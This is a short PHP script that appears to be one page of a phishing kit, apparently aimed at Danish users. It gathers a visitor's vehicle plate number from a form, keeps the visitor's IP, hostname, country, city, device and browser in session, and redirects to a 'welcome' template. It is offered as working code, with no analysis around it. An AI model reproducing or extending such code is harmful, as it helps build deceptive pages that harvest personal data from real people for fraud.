<?php
error_reporting(0);
date_default_timezone_set('Europe/Copenhagen');
session_start();

require './includes/alego.php';
require './config.php';

// Session validation
if(!isset($_SESSION['active'])){
    header('Location: index.php');
    exit();
}

$ip = $_SESSION['ip'];
$hostname = gethostbyaddr($ip);
$_SESSION['country'] = $_SESSION['country'];
$_SESSION['city'] = $_SESSION['city'];
$_SESSION['device'] = $_SESSION['device'];
$_SESSION['browser'] = $_SESSION['browser'];

// Store plate number in session for later
$_SESSION['plate'] = $_POST['mat'];

// Perform the redirect
header("Location: templates/welcome.php");
exit();
?>